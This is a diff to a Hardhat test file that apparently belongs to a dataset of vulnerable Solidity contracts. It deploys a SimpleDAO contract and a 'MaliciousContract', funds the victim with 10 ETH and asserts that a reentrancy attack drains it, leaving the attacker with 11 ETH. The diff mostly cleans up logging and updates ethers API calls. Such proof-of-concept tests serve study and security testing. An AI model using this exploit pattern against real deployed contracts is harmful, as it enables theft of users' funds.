@@ -7,52 +7,50 @@ describe("Reentrancy Attack for simpleDAO.sol", function () {
 
     async function deployContracts() {
     // Deploy SimpleDAO contract
-    console.log('start')
-    const SimpleDAO = await ethers.getContractFactory('contracts/dataset/reentrancy/simple_dao.sol:SimpleDAO');
-    console.log('getContractFactory')
-    const simpleDAO = await SimpleDAO.deploy();
-    console.log('deploy')
+    const SimpleDAOFactory = await ethers.getContractFactory('contracts/dataset/reentrancy/simple_dao.sol:SimpleDAO');
+    const simpleDAO = await SimpleDAOFactory.deploy();
     await simpleDAO.waitForDeployment();
-    let address;
-    simpleDAO.getAddress().then(function(add) {
-        console.log('inside address')
-        console.log(add) // "Some User token"
-        address=add
-        return address
-    });
-    console.log('address'+simpleDAO.getAddress());
-    console.log('start of malicious')
-    console.log(address);
 
     // Deploy MaliciousContract with SimpleDAO address
-    const MaliciousContract = await ethers.getContractFactory('contracts/reentrancy/simple_dao_attack.sol:MaliciousContract');
-    const maliciousContract = await MaliciousContract.deploy(simpleDAO.getAddress().then(function(add) {
-        return add }));
+    const MaliciousContractFactory = await ethers.getContractFactory('contracts/reentrancy/simple_dao_attack.sol:MaliciousContract');
+    const maliciousContract = await MaliciousContractFactory.deploy(simpleDAO.target);
     await maliciousContract.waitForDeployment();
-    console.log('after deploying malicious')
-
-    maliciousContract.getAddress().then(function(add) {
-        console.log('inside malicious address')
-        console.log(add) // "Some User token"
-        address=add
-        return address
-    });
+    
+    //const [_, innocentAddress, attackerAddress] = [simpleDAO.target, maliciousContract.target];
     return {simpleDAO, maliciousContract}
     }
 
 
   it("should successfully drain funds through reentrancy attack", async function () {
     const {simpleDAO, maliciousContract} = await loadFixture(deployContracts);
-    await simpleDAO.Deposit({ value: ethers.utils.parseEther("2") });
-    // Initial donation to SimpleDAO contract by MaliciousContract
-    await maliciousContract.attack({ value: ethers.utils.parseEther("1") });
+    const [_, innocentAddress, attackerAddress] = [,simpleDAO.target, maliciousContract.target];
+
+    console.log(innocentAddress);
+    console.log(attackerAddress);
+
+    // We add 10 ether into victim contract
+    await simpleDAO.donate( innocentAddress, {
+        value: ethers.parseEther("10"),
+      });
+ 
+    // Check that at this point the Victimontract's balance is 10 ETH
+    let balanceETH = await ethers.provider.getBalance(simpleDAO.target);
+    expect(balanceETH).to.equal(ethers.parseEther("10"));
+
+
+    // Attacker calls the `attack` function on MaliciousContract
+    // and sends 1 ETH
+    await maliciousContract.attack({
+        value: ethers.parseEther("1"),
+      });
 
     // Check balances after attack
-    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.address);
-    const simpleDAOBalance = await ethers.provider.getBalance(simpleDAO.address);
+    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);
+    const simpleDAOBalance = await ethers.provider.getBalance(simpleDAO.target);
 
     // Verify the attack was successful
-    expect(maliciousContractBalance).to.equal(ethers.utils.parseEther("0"));
-    expect(simpleDAOBalance).to.equal(ethers.utils.parseEther("1"));
+    expect(maliciousContractBalance).to.equal(ethers.parseEther("11")); //11= 1 from the donation, 10 from the attack
+    expect(simpleDAOBalance).to.equal(ethers.parseEther("0"));
+    
   });
 });
